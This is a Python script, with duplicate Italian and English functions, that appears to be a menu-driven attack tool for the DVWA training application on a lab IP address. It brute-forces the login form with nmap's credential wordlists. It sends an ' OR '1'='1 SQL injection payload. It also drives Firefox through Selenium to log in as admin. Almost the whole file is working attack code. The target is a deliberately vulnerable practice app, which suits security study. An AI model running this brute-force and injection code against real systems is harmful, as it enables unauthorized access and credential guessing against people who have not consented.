import requests
import urllib
import webbrowser
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

def bruteforce_login_pigro():
    login_url = "http://192.168.50.101/dvwa/login.php"

    # Lista di username e password
    usernames = read_credentials("/usr/share/nmap/nselib/data/usernames.lst")
    passwords = read_credentials("/usr/share/nmap/nselib/data/passwords.lst")

    # Effettua il login con tutte le combinazioni di username e password
    for username in usernames:
        for password in passwords:
            # Stampa il tentativo di login
            print(f"Tentativo di login con username: {username}, password: {password}")

            # Effettua una richiesta di login con le credenziali correnti
            response = requests.post(login_url, data={'username': username, 'password': password, 'Login': 'Login'})

            # Verifica se il login è riuscito
            if 'Login failed' not in response.text:
                print(f'{Fore.GREEN}Credenziali trovate:{Style.RESET_ALL} Username - {username}, Password - {password}')
                return True
    return False

# Funzione per effettuare il login tramite Selenium
def login_with_credentials(username, password):
    # Inizializza il driver del browser (Firefox)
    driver = webdriver.Firefox()

    try:
        # Apre la pagina di login
        driver.get("http://192.168.50.101/dvwa/login.php")

        # Attendi 5 secondi per visualizzare la schermata di login
        time.sleep(5)

        # Trova i campi di input per username e password
        username_field = driver.find_element(By.NAME, "username")
        password_field = driver.find_element(By.NAME, "password")

        # Inserisce le credenziali nei campi di input
        username_field.send_keys(username)
        password_field.send_keys(password)

        # Invia il modulo di login
        password_field.send_keys(Keys.RETURN)

        # Attendi qualche secondo per visualizzare il risultato
        time.sleep(5)

        # Seleziona la voce "Brute Force"
        select_brute_force(driver)

        # Effettua il login con le credenziali "admin" e "password"
        login_as_admin(driver)

        # Attendi 5 secondi prima di chiudere il browser
        time.sleep(5)

    finally:
        pass

def login_with_credentials_part(username, password):
    # Inizializza il driver del browser (Firefox)
    driver = webdriver.Firefox()

    try:
        # Apre la pagina di login
        driver.get("http://192.168.50.101/dvwa/login.php")

        # Attendi 5 secondi per visualizzare la schermata di login
        time.sleep(5)

        # Trova i campi di input per username e password
        username_field = driver.find_element(By.NAME, "username")
        password_field = driver.find_element(By.NAME, "password")

        # Inserisce le credenziali nei campi di input
        username_field.send_keys(username)
        password_field.send_keys(password)

        # Invia il modulo di login
        password_field.send_keys(Keys.RETURN)

        # Attendi qualche secondo per visualizzare il risultato
        time.sleep(5)

    finally:
        pass

# Funzione per selezionare "Brute Force"
def select_brute_force(driver):
    # Attendi fino a quando l'elemento "Brute Force" non diventa cliccabile
    brute_force_button = WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.LINK_TEXT, "Brute Force"))
    )
    # Fai clic sull'elemento "Brute Force"
    brute_force_button.click()

# Funzione per effettuare il login con le credenziali "admin" e "password"
def login_as_admin(driver):
    # Trova i campi di input per username e password sulla pagina di login
    username_field = driver.find_element(By.NAME, "username")
    password_field = driver.find_element(By.NAME, "password")

    # Inserisci le credenziali nei campi di input
    username_field.clear()
    password_field.clear()
    username_field.send_keys("admin")
    password_field.send_keys("password")

    # Invia il modulo di login
    password_field.send_keys(Keys.RETURN)

# Funzione per leggere le credenziali da un file
def read_credentials(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

def sql_injection_attack(url="http://192.168.50.101/dvwa/vulnerabilities/brute/", sql_injection="' OR '1'='1"):
    """
    Esegue un attacco di SQL injection su una pagina web vulnerabile.

    Args:
    - url (str): L'URL della pagina vulnerabile. Default: pagina specifica DVWA.
    - sql_injection (str): La stringa di SQL injection da utilizzare. Default: SQL injection comune.

    Returns:
    - str: La risposta ottenuta dalla richiesta GET.
    """
    # Parametri della richiesta GET
    params = {
        'username': sql_injection,
        'password': 'anything',  # non necessario, ma potrebbe essere richiesto dal form
        'Login': 'Login'         # non necessario, ma potrebbe essere richiesto dal form
    }

    # Effettua la richiesta GET
    response = requests.get(url, params=params)

    # Restituisci la risposta
    return response.text

def print_dvwa_menu():
    print(Fore.WHITE +
          "[1] Login page\n"
          "[2] SQL Injection - Level Low\n" 
          "[3] Brute Force completo (log-in + tutti i livelli)\n" 
          "[4] Back...")

def print_dvwa_menu_ENG():
    print(Fore.WHITE +
        "[1] Login page\n"
        "[2] SQL Injection - Level Low\n"
        "[3] Full Brute Force (login + all levels)\n"
        "[4] Back...")


def start_ITA():
    from config import LANGUAGE
    while True:
        choice =int(input("Inserire l'opzione desiderata: "))
        
        if choice == 1:
            if bruteforce_login_pigro():
                print(f'{Fore.GREEN}Credenziali trovate.{Style.RESET_ALL}')
                # Effettua il login tramite Selenium
                login_with_credentials_part("admin", "password")
            else:
                print(f'{Fore.RED}Nessuna combinazione di username e password valide trovata.{Style.RESET_ALL}')
            print_dvwa_menu()

        elif choice == 2:
            result = sql_injection_attack()
            print (result)
            print_dvwa_menu()

        elif choice == 3:
            if bruteforce_login_pigro():
                print(f'{Fore.GREEN}Credenziali trovate.{Style.RESET_ALL}')
                # Effettua il login tramite Selenium
                login_with_credentials("admin", "password")
            else:
                print(f'{Fore.RED}Nessuna combinazione di username e password valide trovata.{Style.RESET_ALL}')
            print_dvwa_menu()

        elif choice == 4:
            break  # Esci dal menu se scegli di tornare indietro

def sql_injection_attack_ENG(url="http://192.168.50.101/dvwa/vulnerabilities/brute/", sql_injection="' OR '1'='1"):
    """
    Executes an SQL injection attack on a vulnerable web page.

    Args:
    - url (str): The URL of the vulnerable page. Default: DVWA specific page.
    - sql_injection (str): The SQL injection string to use. Default: common SQL injection.

    Returns:
    - str: The response obtained from the GET request.
    """
    # Parameters for the GET request
    params = {
        'username': sql_injection,
        'password': 'anything',  # not necessary, but might be required by the form
        'Login': 'Login'         # not necessary, but might be required by the form
    }

    # Perform the GET request
    response = requests.get(url, params=params)

    # Return the response
    return response.text


def login_as_admin_ENG(driver):
    # Find the input fields for username and password on the login page
    username_field = driver.find_element(By.NAME, "username")
    password_field = driver.find_element(By.NAME, "password")

    # Clear the input fields
    username_field.clear()
    password_field.clear()

    # Enter the credentials into the input fields
    username_field.send_keys("admin")
    password_field.send_keys("password")

    # Submit the login form
    password_field.send_keys(Keys.RETURN)


def login_with_credentials_part_ENG(username, password):
    # Initialize the browser driver (Firefox)
    driver = webdriver.Firefox()

    try:
        # Open the login page
        driver.get("http://192.168.50.101/dvwa/login.php")

        # Wait for 5 seconds to display the login screen
        time.sleep(5)

        # Find the input fields for username and password
        username_field = driver.find_element(By.NAME, "username")
        password_field = driver.find_element(By.NAME, "password")

        # Enter the credentials into the input fields
        username_field.send_keys(username)
        password_field.send_keys(password)

        # Submit the login form
        password_field.send_keys(Keys.RETURN)

        # Wait for a few seconds to display the result
        time.sleep(5)

    finally:
        pass


def bruteforce_login_pigro_ENG():
    login_url = "http://192.168.50.101/dvwa/login.php"

    # List of usernames and passwords
    usernames = read_credentials("/usr/share/nmap/nselib/data/usernames.lst")
    passwords = read_credentials("/usr/share/nmap/nselib/data/passwords.lst")

    # Attempt login with all combinations of username and password
    for username in usernames:
        for password in passwords:
            # Print login attempt
            print(f"Attempting login with username: {username}, password: {password}")

            # Make a login request with the current credentials
            response = requests.post(login_url, data={'username': username, 'password': password, 'Login': 'Login'})

            # Check if login was successful
            if 'Login failed' not in response.text:
                print(f'{Fore.GREEN}Credentials found:{Style.RESET_ALL} Username - {username}, Password - {password}')
                return True
    return False


def select_brute_force_ENG(driver):
    # Wait until the "Brute Force" element becomes clickable
    brute_force_button = WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.LINK_TEXT, "Brute Force"))
    )
    # Click on the "Brute Force" element
    brute_force_button.click()


def login_with_credentials_ENG(username, password):
    # Initialize the browser driver (Firefox)
    driver = webdriver.Firefox()

    try:
        # Open the login page
        driver.get("http://192.168.50.101/dvwa/login.php")

        # Wait for 5 seconds to display the login screen
        time.sleep(5)

        # Find the input fields for username and password
        username_field = driver.find_element(By.NAME, "username")
        password_field = driver.find_element(By.NAME, "password")

        # Enter the credentials into the input fields
        username_field.send_keys(username)
        password_field.send_keys(password)

        # Submit the login form
        password_field.send_keys(Keys.RETURN)

        # Wait for a few seconds to display the result
        time.sleep(5)

        # Select the "Brute Force" option
        select_brute_force_ENG(driver)

        # Login with the credentials "admin" and "password"
        login_as_admin_ENG(driver)

        # Wait for 5 seconds before closing the browser
        time.sleep(5)

    finally:
        pass

def start_ENG():
    while True:
        choice = int(input("Enter the desired option: "))
        
        if choice == 1:
            if bruteforce_login_pigro_ENG():
                print(f'{Fore.GREEN}Credentials found.{Style.RESET_ALL}')
                # Login using Selenium
                login_with_credentials_part_ENG("admin", "password")
            else:
                print(f'{Fore.RED}No valid combination of username and password found.{Style.RESET_ALL}')
            print_dvwa_menu_ENG()

        elif choice == 2:
            result = sql_injection_attack_ENG()
            print(result)
            print_dvwa_menu_ENG()

        elif choice == 3:
            if bruteforce_login_pigro_ENG():
                print(f'{Fore.GREEN}Credentials found.{Style.RESET_ALL}')
                # Login using Selenium
                login_with_credentials_ENG("admin", "password")
            else:
                print(f'{Fore.RED}No valid combination of username and password found.{Style.RESET_ALL}')
            print_dvwa_menu_ENG()

        elif choice == 4:
            break  # Continue the loop if the user chooses to go back